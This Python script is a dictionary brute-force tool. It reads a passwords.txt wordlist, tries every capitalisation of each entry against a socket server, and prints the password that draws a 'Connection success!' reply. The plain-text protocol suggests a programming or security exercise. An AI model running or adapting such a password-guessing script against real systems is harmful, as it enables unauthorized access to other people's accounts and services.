import socket
import sys
import itertools
import os


def up_low_combinator(x):
    for var in map(''.join, itertools.product(*zip(x.upper(), x.lower()))):
        yield var


def reader(file_name):
    with open(file_name, "r") as file:
        for row in file:
            yield row.rstrip()


hack_socket = socket.socket()

host = str(sys.argv[1])
port = int(sys.argv[2])

hack_socket.connect((host, port))

absolute_path = os.path.dirname(os.path.abspath(__file__))
file_path = absolute_path + '\\passwords.txt'

breaker = False
for raw_pass in reader(file_path):
    for password in up_low_combinator(raw_pass):
        request = password
        byte_request = request.encode()
        hack_socket.send(byte_request)
        byte_result = hack_socket.recv(1024)
        result = byte_result.decode()
        if result == "Connection success!":
            print(password)
            breaker = True
            break
    if breaker:
        break

hack_socket.close()
